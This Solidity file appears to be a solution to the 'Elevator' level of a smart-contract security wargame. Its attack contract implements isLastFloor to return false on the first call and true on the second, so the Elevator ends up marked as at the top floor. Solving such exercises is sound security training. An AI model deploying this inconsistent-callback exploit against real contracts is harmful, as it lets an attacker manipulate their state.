// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../levels/Elevator.sol";
import {Building} from "../levels/Elevator.sol";

contract ElevatorAttack is Building{
    uint256 private floor;
    constructor(){

    }

    function isLastFloor(uint256 _floor) external returns(bool){
        if (_floor != floor){
            floor = _floor;
            return false;
        }
        return true;
    }

    function attack(Elevator elevator, uint256 _floor) external{
        elevator.goTo(_floor);
    }
}
